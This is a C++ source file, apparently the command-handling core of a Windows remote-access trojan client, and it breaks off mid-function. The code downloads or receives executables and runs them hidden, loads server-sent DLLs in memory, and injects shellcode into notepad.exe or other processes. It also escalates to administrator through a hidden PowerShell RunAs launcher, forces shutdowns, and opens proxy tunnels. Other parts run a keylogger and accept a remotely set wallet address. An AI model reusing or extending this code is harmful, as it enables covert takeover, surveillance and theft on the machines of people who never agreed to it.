// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
#include <iostream>
#include <vector>
#include <fstream>
#include <corecrt_io.h>
#include "ClientDll.h"
#include "MemoryModule.h"
#include "common/dllRunner.h"
#include "server/2015Remote/pwd_gen.h"
#include <common/iniFile.h>
#include "IOCPUDPClient.h"
#include "IOCPKCPClient.h"
#include "auto_start.h"
#include "ShellcodeInj.h"
#include "KeyboardManager.h"
#include "common/file_upload.h"
extern "C" {
#include "ServiceWrapper.h"
}

#pragma comment(lib, "urlmon.lib")

int CKernelManager::g_IsAppExit = FALSE;

// UDP 协议仅能针对小包数据，且数据没有时序关联
IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
{
    if (conn->protoType == PROTO_HTTPS) return NULL;

    int type = conn->protoType == PROTO_RANDOM ? time(nullptr) % PROTO_RANDOM : conn->protoType;
    if (!conn->IsVerified() || type == PROTO_TCP)
        return new IOCPClient(bExit, exit_while_disconnect, MaskTypeNone, conn, publicIP);
    if (type == PROTO_UDP)
        return new IOCPUDPClient(bExit, exit_while_disconnect);
    if (type == PROTO_HTTP || type == PROTO_HTTPS)
        return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn, publicIP);
    if (type == PROTO_KCP) {
        return new IOCPKCPClient(bExit, exit_while_disconnect);
    }

    return NULL;
}

ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string &publicIP)
{
    static ThreadInfo tKeyboard;
    tKeyboard.run = FOREVER_RUN;
    tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn, publicIP);
    tKeyboard.conn = conn;
    tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
    return &tKeyboard;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s)
    : m_conn(conn), m_hInstance(hInstance), CManager(ClientObject), g_bExit(s)
{
    m_ulThreadCount = 0;
#ifdef _DEBUG
    m_settings = { 5 };
#else
    m_settings = { 0 };
#endif
    m_nNetPing = {};
    m_hKeyboard = kb;
    // C2C 初始化
    if (conn) m_MyClientID = conn->clientID;
}

BOOL IsThreadsRunning(ThreadInfo* threads, int count)
{
    for (int i = 0; i < count; ++i) {
        if (threads[i].p) {
            return TRUE;
        }
    }
    return FALSE;
}

CKernelManager::~CKernelManager()
{
    Mprintf("~CKernelManager begin\n");
    HANDLE hList[MAX_THREADNUM] = {};
    for (int i=0; i<MAX_THREADNUM; ++i) {
        if (m_hThread[i].h!=0) {
			hList[i] = m_hThread[i].h;
            SAFE_CLOSE_HANDLE(m_hThread[i].h);
            m_hThread[i].h = NULL;
            m_hThread[i].run = FALSE;
        }
    }

    WAIT_n(IsThreadsRunning(m_hThread, MAX_THREADNUM), 5, 50);
    for (int i = 0; i < MAX_THREADNUM; ++i) {
        if (hList[i] != 0 && m_hThread[i].p) {
            Mprintf("~CKernelManager: TerminateThread for %d\n", i);
            TerminateThread(hList[i], 0x20260226);
        }
    }
    m_ulThreadCount = 0;
    Mprintf("~CKernelManager end\n");
}

// 获取可用的线程下标
UINT CKernelManager::GetAvailableIndex()
{
    if (m_ulThreadCount < MAX_THREADNUM) {
        return m_ulThreadCount;
    }

    for (int i = 0; i < MAX_THREADNUM; ++i) {
        if (m_hThread[i].p == NULL) {
            return i;
        }
    }
    return -1;
}

BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "ServerDll.new")
{
    char path[_MAX_PATH], * p = path;
    GetModuleFileNameA(NULL, path, sizeof(path));
    while (*p) ++p;
    while ('\\' != *p) --p;
    strcpy(p + 1, name);
    if (_access(path, 0) != -1) {
        if (std::string("ServerDll.new")!=name) return TRUE;
        DeleteFileA(path);
    }
    // 打开文件，以二进制模式写入
    std::string filePath = path;
    std::ofstream outFile(filePath, std::ios::binary);

    if (!outFile) {
        Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
        return FALSE;
    }

    // 写入二进制数据
    outFile.write(data, size);

    if (outFile.good()) {
        Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
    } else {
        Mprintf("Failed to write data to file.\n");
        outFile.close();
        return FALSE;
    }

    // 关闭文件
    outFile.close();
    // 设置文件属性为隐藏
    if (SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
        Mprintf("File created and set to hidden: %s\n", filePath.c_str());
    }
    return TRUE;
}

template <typename T = DllExecuteInfo>
class DllExecParam
{
public:
    T *info;
    PluginParam param;
    BYTE* buffer;
    CManager* manager;
    DllExecParam(const T& dll, const PluginParam& arg, BYTE* data, CManager* m) : info(new T()), param(arg), manager(m)
    {
        buffer = new BYTE[dll.Size];
        memcpy(buffer, data, dll.Size);
        memcpy(info, &dll, sizeof(dll));
    }
    ~DllExecParam()
    {
        SAFE_DELETE_ARRAY(buffer);
        SAFE_DELETE(info);
    }
};


class MemoryDllRunner : public DllRunner
{
protected:
    HMEMORYMODULE m_mod;
public:
    MemoryDllRunner() : m_mod(nullptr) {}
    virtual void* LoadLibraryA(const char* data, int size)
    {
        return (m_mod = ::MemoryLoadLibrary(data, size));
    }
    virtual FARPROC GetProcAddress(void* mod, const char* lpProcName)
    {
        return ::MemoryGetProcAddress((HMEMORYMODULE)mod, lpProcName);
    }
    virtual BOOL FreeLibrary(void* mod)
    {
        ::MemoryFreeLibrary((HMEMORYMODULE)mod);
        return TRUE;
    }
};

typedef int (*RunSimpleTcpFunc)(
    const char* privilegeKey,
    long timestamp,
    const char* serverAddr,
    int serverPort,
    int localPort,
    int remotePort,
    int* statusPtr
);

typedef int (*RunSimpleTcpWithTokenFunc)(
    const char* token,
    const char* serverAddr,
    int serverPort,
    int localPort,
    int remotePort,
    int* statusPtr
);

DWORD WINAPI ExecuteDLLProc(LPVOID param)
{
    DllExecParam<>* dll = (DllExecParam<>*)param;
    DllExecuteInfo info = *(dll->info);
    PluginParam pThread = dll->param;
    CManager* This = dll->manager;
#if _DEBUG
    WriteBinaryToFile((char*)dll->buffer, info.Size, info.Name);
    DllRunner* runner = new DefaultDllRunner(info.Name);
#else
    DllRunner* runner = new MemoryDllRunner();
#endif
    if (info.RunType == MEMORYDLL) {
        HMEMORYMODULE module = runner->LoadLibraryA((char*)dll->buffer, info.Size);
        switch (info.CallType) {
        case CALLTYPE_DEFAULT:
            while (S_CLIENT_EXIT != *pThread.Exit)
                Sleep(1000);
            break;
        case CALLTYPE_IOCPTHREAD: {
            PTHREAD_START_ROUTINE proc =  module ? (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run") : NULL;
            Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
            if (proc) {
                proc(&pThread);
            } else {
                while (S_CLIENT_EXIT != *pThread.Exit)
                    Sleep(1000);
            }
            break;
        }
        case CALLTYPE_FRPC_CALL: {
            RunSimpleTcpFunc proc = module ? (RunSimpleTcpFunc)runner->GetProcAddress(module, "RunSimpleTcp") : NULL;
            char* user = (char*)dll->param.User;
            FrpcParam* f = (FrpcParam*)user;
            if (proc) {
                Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
                int r=proc(f->privilegeKey, f->timestamp, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
                           &CKernelManager::g_IsAppExit);
                if (r) {
                    char buf[100];
                    sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
                    Mprintf("%s\n", buf);
                    ClientMsg msg("代理端口", buf);
                    This->SendData((LPBYTE)&msg, sizeof(msg));
                }
            }
            SAFE_DELETE_ARRAY(user);
            break;
        }
        case CALLTYPE_FRPC_STDCALL: {
            RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
            char* user = (char*)dll->param.User;
            FrpcParam* f = (FrpcParam*)user;
            if (proc) {
                Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
                int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
                             &CKernelManager::g_IsAppExit);
                if (r) {
                    char buf[100];
                    sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
                    Mprintf("%s\n", buf);
                    ClientMsg msg("代理端口", buf);
                    This->SendData((LPBYTE)&msg, sizeof(msg));
                }
            }
            SAFE_DELETE_ARRAY(user);
            break;
        }
        default:
            break;
        }
        if (info.CallType != CALLTYPE_FRPC_CALL && info.CallType != CALLTYPE_FRPC_STDCALL)
            runner->FreeLibrary(module);
    } else if (info.RunType == SHELLCODE) {
        bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
        ShellcodeInj inj(dll->buffer, info.Size, flag ? "run" : 0, flag ? &pThread : 0, flag ? sizeof(PluginParam) : 0);
        if (info.Pid < 0) info.Pid = GetCurrentProcessId();
        int ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
        char buf[256];
        sprintf_s(buf, "Inject %s to process [%d] %s", info.Name, info.Pid ? info.Pid : ret, ret ? "succeed" : "failed");
        Mprintf("%s\n", buf);
        ClientMsg msg("代码注入", buf);
        This->SendData((LPBYTE)&msg, sizeof(msg));
    }
    SAFE_DELETE(dll);
    SAFE_DELETE(runner);
    return 0x20250529;
}

DWORD WINAPI SendKeyboardRecord(LPVOID lParam)
{
    CKeyboardManager1* pMgr = (CKeyboardManager1*)lParam;
    if (pMgr) {
        pMgr->Reconnect();
        pMgr->Notify();
    }
    return 0xDead0001;
}

// 判断 PowerShell 版本是否 >= 3.0
bool IsPowerShellAvailable()
{
    // 设置启动信息
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // 隐藏窗口

    // 创建匿名管道以捕获 PowerShell 输出
    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
    sa.bInheritHandle = TRUE; // 管道句柄可继承

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        Mprintf("CreatePipe failed. Error: %d\n", GetLastError());
        return false;
    }

    // 设置标准输出和错误输出到管道
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // 构造 PowerShell 命令
    std::string command = "powershell -Command \"$PSVersionTable.PSVersion.Major\"";
    // 创建 PowerShell 进程
    if (!CreateProcess(
            nullptr,                      // 不指定模块名（使用命令行）
            (LPSTR)command.c_str(),       // 命令行参数
            nullptr,                      // 进程句柄不可继承
            nullptr,                      // 线程句柄不可继承
            TRUE,                         // 继承句柄
            CREATE_NO_WINDOW,             // 不显示窗口
            nullptr,                      // 使用父进程环境块
            nullptr,                      // 使用父进程工作目录
            &si,                          // 启动信息
            &pi                           // 进程信息
        )) {
        Mprintf("CreateProcess failed. Error: %d\n", GetLastError());
        SAFE_CLOSE_HANDLE(hReadPipe);
        SAFE_CLOSE_HANDLE(hWritePipe);
        return false;
    }

    // 关闭管道的写端
    SAFE_CLOSE_HANDLE(hWritePipe);

    // 读取 PowerShell 输出
    std::string result;
    char buffer[128];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    // 关闭管道的读端
    SAFE_CLOSE_HANDLE(hReadPipe);

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 获取退出代码
    DWORD exitCode=0;
    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
        Mprintf("GetExitCodeProcess failed. Error: %d\n", GetLastError());
        SAFE_CLOSE_HANDLE(pi.hProcess);
        SAFE_CLOSE_HANDLE(pi.hThread);
        return false;
    }

    // 关闭进程和线程句柄
    SAFE_CLOSE_HANDLE(pi.hProcess);
    SAFE_CLOSE_HANDLE(pi.hThread);

    // 解析返回的版本号
    if (exitCode == 0) {
        try {
            int version = std::stoi(result);
            Mprintf("PowerShell version: %d\n", version);
            return version >= 3;
        } catch (...) {
            Mprintf("Failed to parse PowerShell version.\n");
            return false;
        }
    } else {
        Mprintf("PowerShell command failed with exit code: %d\n", exitCode);
        return false;
    }
}

/*
Windows 10/11: 👉 放心使用，可以直接运行
Windows 7: 如果 PowerShell 版本 >= 3.0，可以运行; 否则无法以管理员权限重启
*/
bool StartAdminLauncherAndExit(const char* exePath, bool admin = true)
{
    // 获取当前进程 ID
    DWORD currentPID = GetCurrentProcessId();

    // 构造 PowerShell 命令，等待当前进程退出后以管理员权限启动
    std::string launcherCmd = "powershell -Command \"Start-Sleep -Seconds 1; " // 等待 1 秒，确保当前进程退出
                              "while (Get-Process -Id " + std::to_string(currentPID) + " -ErrorAction SilentlyContinue) { Start-Sleep -Milliseconds 500 }; "
                              "Start-Process -FilePath '" + std::string(exePath);
    launcherCmd += admin ? "' -Verb RunAs\"" : "' \""; // 以管理员权限启动目标进程

    // 启动隐藏的 cmd 进程
    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 隐藏窗口
    PROCESS_INFORMATION pi = {};
    Mprintf("Run: %s\n", launcherCmd.c_str());
    if (CreateProcessA(NULL, (LPSTR)launcherCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Mprintf("CreateProcess to start launcher process [%d].\n", pi.dwProcessId);
        SAFE_CLOSE_HANDLE(pi.hProcess);
        SAFE_CLOSE_HANDLE(pi.hThread);
        return true;
    }

    Mprintf("Failed to start launcher process.\n");
    return false;
}

BOOL IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }

    return isAdmin;
}

bool EnableShutdownPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 打开当前进程的令牌
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    // 获取关机权限的 LUID
    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        SAFE_CLOSE_HANDLE(hToken);
        return false;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // 启用关机权限
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        SAFE_CLOSE_HANDLE(hToken);
        return false;
    }

    SAFE_CLOSE_HANDLE(hToken);
    return true;
}

class CDownloadCallback : public IBindStatusCallback
{
private:
    DWORD m_startTime;
    DWORD m_timeout;  // 毫秒

public:
    CDownloadCallback(DWORD timeoutMs) : m_timeout(timeoutMs)
    {
        m_startTime = GetTickCount();
    }

    HRESULT STDMETHODCALLTYPE OnProgress(ULONG ulProgress, ULONG ulProgressMax,
                                         ULONG ulStatusCode, LPCWSTR szStatusText) override
    {
        // 超时检查
        if (GetTickCount() - m_startTime > m_timeout) {
            return E_ABORT;  // 取消下载
        }
        return S_OK;
    }

    // 其他接口方法返回默认值
    HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD, IBinding*) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE GetPriority(LONG*) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE OnLowResource(DWORD) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT, LPCWSTR) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD*, BINDINFO*) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD, DWORD, FORMATETC*, STGMEDIUM*) override
    {
        return S_OK;
    }
    HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID, IUnknown*) override
    {
        return S_OK;
    }

    // IUnknown
    ULONG STDMETHODCALLTYPE AddRef() override
    {
        return 1;
    }
    ULONG STDMETHODCALLTYPE Release() override
    {
        return 1;
    }
    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override
    {
        if (riid == IID_IBindStatusCallback || riid == IID_IUnknown) {
            *ppv = this;
            return S_OK;
        }
        return E_NOINTERFACE;
    }
};

void DownExecute(const std::string &strUrl, CManager *This)
{
    // 临时路径
    char szTempPath[MAX_PATH], szSavePath[MAX_PATH];
    GetTempPathA(MAX_PATH, szTempPath);
    srand(GetTickCount64());
    sprintf_s(szSavePath, "%sDownload_%d.exe", szTempPath, rand() % 10086);

    // 下载并运行
    const int timeoutMs = 30 * 1000;
    CDownloadCallback callback(timeoutMs);
    if (S_OK == URLDownloadToFileA(NULL, strUrl.c_str(), szSavePath, 0, &callback)) {
        ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
        Mprintf("Download Exec Success: %s\n", strUrl.c_str());
        char buf[100];
        sprintf_s(buf, "Client %llu download exec succeed", This->GetClientID());
        ClientMsg msg("执行成功", buf);
        This->SendData(LPBYTE(&msg), sizeof(msg));
    } else {
        Mprintf("Download Exec Failed: %s\n", strUrl.c_str());
        char buf[100];
        sprintf_s(buf, "Client %llu download exec failed", This->GetClientID());
        ClientMsg msg("执行失败", buf);
        This->SendData(LPBYTE(&msg), sizeof(msg));
    }
}

#include "common/location.h"
std::string getHardwareIDByCfg(const std::string& pwdHash, const std::string& masterHash)
{
    config* m_iniFile = nullptr;
#ifdef _DEBUG
    m_iniFile = pwdHash == masterHash ? new config : new iniFile;
#else
    m_iniFile = new iniFile;
#endif
    int version = m_iniFile->GetInt("settings", "BindType", 0);
    std::string master = m_iniFile->GetStr("settings", "master");
    SAFE_DELETE(m_iniFile);
    switch (version) {
    case 0:
        return getHardwareID();
    case 1: {
        if (!master.empty()) {
            return master;
        }
        IPConverter cvt;
        return cvt.getPublicIP();
    }
    }
    return "";
}

template<typename T = DllExecuteInfo>
BOOL ExecDLL(CKernelManager *This, PBYTE szBuffer, ULONG ulLength, void *user)
{
    static std::map<std::string, std::vector<BYTE>> m_MemDLL;
    const int sz = 1 + sizeof(T);
    if (ulLength < sz) return FALSE;
    const T* info = (T*)(szBuffer + 1);
    const char* md5 = info->Md5;
    auto find = m_MemDLL.find(md5);
    if (find == m_MemDLL.end() && ulLength == sz) {
        iniFile cfg(CLIENT_PATH);
        auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
        if (md5.empty() || md5 != info->Md5 || !This->m_conn->IsVerified()) {
            // 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
            This->m_ClientObject->Send2Server((char*)szBuffer, ulLength);
            return TRUE;
        }
        Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
        binFile bin(CLIENT_PATH);
        auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
        const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
        m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
        find = m_MemDLL.find(md5);
    }
    BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
    if (info->Size == ulLength - sz) {
        if (md5[0]) {
            m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
            iniFile cfg(CLIENT_PATH);
            cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
            binFile bin(CLIENT_PATH);
            std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
            bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
            Mprintf("Save DLL to registry: %s\n", md5);
        }
        data = szBuffer + sz;
    }
    if (data) {
        PluginParam param(This->m_conn->ServerIP(), This->m_conn->ServerPort(), &This->g_bExit, user);
        CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam<T>(*info, param, data, This), 0, NULL));
        Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
    }
    return data != NULL;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
    bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
    if ((m_ulThreadCount = GetAvailableIndex()) == -1 && !isExit) {
        return Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
    } else if (!isExit) {
        m_hThread[m_ulThreadCount].p = nullptr;
        m_hThread[m_ulThreadCount].conn = m_conn;
    }
    std::string publicIP = m_ClientObject->GetClientIP();

    switch (szBuffer[0]) {
    case CMD_SET_GROUP: {
        std::string group = std::string((char*)szBuffer + 1);
        iniFile cfg(CLIENT_PATH);
        cfg.SetStr("settings", "group_name", group);
        break;
    }

    case COMMAND_DOWN_EXEC: {
        std::thread(DownExecute, std::string((char*)szBuffer + 1), this).detach();
        break;
    }

    case COMMAND_UPLOAD_EXEC: {
        if (ulLength < 5) break;

        DWORD dwFileSize = *(DWORD*)(szBuffer + 1);
        if (dwFileSize == 0 || ulLength < (5 + dwFileSize)) break;
        BYTE* pFileData = szBuffer + 5;

        char szTempPath[MAX_PATH], szSavePath[MAX_PATH];
        GetTempPathA(MAX_PATH, szTempPath);
        srand(GetTickCount64());
        sprintf_s(szSavePath, "%sUpload_%d.exe", szTempPath, rand() % 10086);

        FILE* fp = fopen(szSavePath, "wb");
        if (fp) {
            fwrite(pFileData, 1, dwFileSize, fp);
            fclose(fp);
            ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
            Mprintf("Upload Exec Success: %d bytes\n", dwFileSize);
        }
        char buf[100];
        sprintf_s(buf, "Client %llu upload exec %s", m_conn->clientID, fp ? "succeed" : "failed");
        ClientMsg msg(fp ? "执行成功" : "执行失败", buf);
        SendData(LPBYTE(&msg), sizeof(msg));
        break;
    }
    case TOKEN_MACHINE_MANAGE:
        if (ulLength <= 1 || !EnableShutdownPrivilege()) break;
#ifdef _DEBUG
        Mprintf("收到机器管理命令: %d, %d\n", szBuffer[0], szBuffer[1]);
        break;
#endif
        switch (szBuffer[1]) {
        case MACHINE_LOGOUT: {
            ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
            break;
        }
        case MACHINE_SHUTDOWN: {
            ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
            break;
        }
        case MACHINE_REBOOT: {
            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
            break;
        }
        default:
            break;
        }
    case CMD_RUNASADMIN: {
        char curFile[_MAX_PATH] = {};
        GetModuleFileName(NULL, curFile, MAX_PATH);
        if (!IsRunningAsAdmin()) {
            if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile)) {
                g_bExit = S_CLIENT_EXIT;
                // 强制退出当前进程，并稍后以管理员权限运行
                Mprintf("CKernelManager: [%s] Restart with administrator privileges.\n", curFile);
                Sleep(1000);
                TerminateProcess(GetCurrentProcess(), 0xABCDEF);
            }
            Mprintf("CKernelManager: [%s] Restart with administrator privileges FAILED.\n", curFile);
            break;
        }
        Mprintf("CKernelManager: [%s] Running with administrator privileges.\n", curFile);
        break;
    }
    case CMD_AUTHORIZATION: {
        HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
        hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
#ifndef _DEBUG
        if (hMutex == NULL) { // 没有互斥量，主程序可能未运行
            Mprintf("!!! [WARN] Master program is not running.\n");
        }
#endif
        SAFE_CLOSE_HANDLE(hMutex);

        char buf[100] = {}, *passCode = buf + 5;
        memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
        std::string masterHash(skCrypt(MASTER_HASH));
        const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
        if (passCode[0] == 0) {
            static std::string hardwareId = getHardwareIDByCfg(pwdHash, masterHash);
            static std::string hashedID = hashSHA256(hardwareId);
            static std::string devId = getFixedLengthID(hashedID);
            memcpy(buf + 24, buf + 12, 8); // 消息签名
            memcpy(buf + 96, buf + 8, 4); // 时间戳
            memcpy(buf + 5, devId.c_str(), devId.length());		// 16字节
            memcpy(buf + 32, pwdHash, 64);						// 64字节
            m_ClientObject->Send2Server((char*)buf, sizeof(buf));
            Mprintf("Request for authorization update.\n");
        } else {
            unsigned short* days = (unsigned short*)(buf + 1);
            unsigned short* num = (unsigned short*)(buf + 3);
            config* cfg = IsDebug ? new config : new iniFile;
            cfg->SetStr("settings", "Password", *days <= 0 ? "" : passCode);
            cfg->SetStr("settings", "PwdHmac", *days <= 0 ? "" : buf + 64);
            Mprintf("Update authorization: %s, PwdHmac: %s\n", passCode, buf+64);
            delete cfg;
            g_bExit = S_SERVER_EXIT;
        }
        break;
    }
    case CMD_EXECUTE_DLL: {
        if (!ExecDLL(this, szBuffer, ulLength, m_conn)) {
            Mprintf("CKernelManager ExecDLL failed: %d bytes\n", ulLength);
        }
        break;
    }
    case CMD_EXECUTE_DLL_NEW: {
        if (sizeof(szBuffer) == 4) {
            Mprintf("CKernelManager ExecDLL failed: NOT x64 client\n");
            break;
        }
        DllExecuteInfoNew* info = ulLength > sizeof(DllExecuteInfoNew) ? (DllExecuteInfoNew*)(szBuffer + 1) : 0;
        char* user = info ? new char[400] : 0;
        if (user == NULL) break;;
        if (info) memcpy(user, info->Parameters, 400);
        if (!ExecDLL<DllExecuteInfoNew>(this, szBuffer, ulLength, user)) {
            Mprintf("CKernelManager ExecDLL failed: received %d bytes\n", ulLength);
        }
        break;
    }

    case TOKEN_PRIVATESCREEN: {
        char h[100] = {};
        memcpy(h, szBuffer + 1, min(ulLength - 1, 80));
        std::string hash = std::string(h, h + 64);
        std::string hmac = std::string(h + 64, h + 80);

        // 提取位图数据（如果有）
        std::vector<BYTE> bmpData;
        if (ulLength > 85) {  // 1 + 64 + 16 + 4 = 85
            DWORD bmpSize = 0;
            memcpy(&bmpSize, szBuffer + 81, 4);
            if (bmpSize > 0 && bmpSize <= ulLength - 85) {
                bmpData.resize(bmpSize);
                memcpy(bmpData.data(), szBuffer + 85, bmpSize);
            }
        }

        std::thread t(private_desktop, m_conn, g_bExit, m_LoginMsg, m_LoginSignature, hash, hmac, std::move(bmpData));
        t.detach();
        break;
    }

    case COMMAND_PROXY: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_SHARE:
    case COMMAND_ASSIGN_MASTER:
        if (ulLength > 2) {
            switch (szBuffer[1]) {
            case SHARE_TYPE_YAMA_FOREVER: {
                auto v = StringToVector((char*)szBuffer + 2, ':', 3);
                if (v[0].empty() || v[1].empty())
                    break;

                iniFile cfg(CLIENT_PATH);
                auto now = time(nullptr);
                auto valid_to = atoi(cfg.GetStr("settings", "valid_to").c_str());
                if (now <= valid_to) break; // Avoid assign again
                cfg.SetStr("settings", "master", v[0]);
                cfg.SetStr("settings", "port", v[1]);
                float days = atof(v[2].c_str());
                if (days > 0) {
                    auto valid_to = time(0) + days*86400;
                    // overflow after 2038-01-19
                    cfg.SetStr("settings", "valid_to", std::to_string(valid_to));
                }
            }
            case SHARE_TYPE_YAMA: {
                auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
                if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
                break;
            }
            case SHARE_TYPE_HOLDINGHANDS:
                break;
            }
        }
        break;

    case CMD_HEARTBEAT_ACK:
        OnHeatbeatResponse(szBuffer, ulLength);
        break;
    case CMD_MASTERSETTING:
        if (ulLength > MasterSettingsOldSize) {
            memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
            if (m_settings.Signature[0] && m_LoginSignature.empty()) {
                m_LoginSignature = std::string(m_settings.Signature, m_settings.Signature + 64);
                bool verifyMessage(const std::string & publicKey, BYTE * msg, int len, const std::string & signature);
                bool verified = verifyMessage("", (BYTE*)m_LoginMsg.data(), m_LoginMsg.length(), m_LoginSignature);
                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds. Verified: %s\n", ulLength - 1, m_settings.ReportInterval,
                        verified ? "success" : "failed");
            } else {
                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
            }
            iniFile cfg(CLIENT_PATH);
            cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
            CManager* pMgr = (CManager*)m_hKeyboard->user;
            if (pMgr) {
                pMgr->UpdateWallet(m_settings.WalletAddress);
            }
            if (m_settings.EnableKBLogger && m_hKeyboard) {
                CKeyboardManager1* mgr = (CKeyboardManager1*)m_hKeyboard->user;
                mgr->m_bIsOfflineRecord = TRUE;
            }
            Logger::getInstance().usingLog(m_settings.EnableLog);
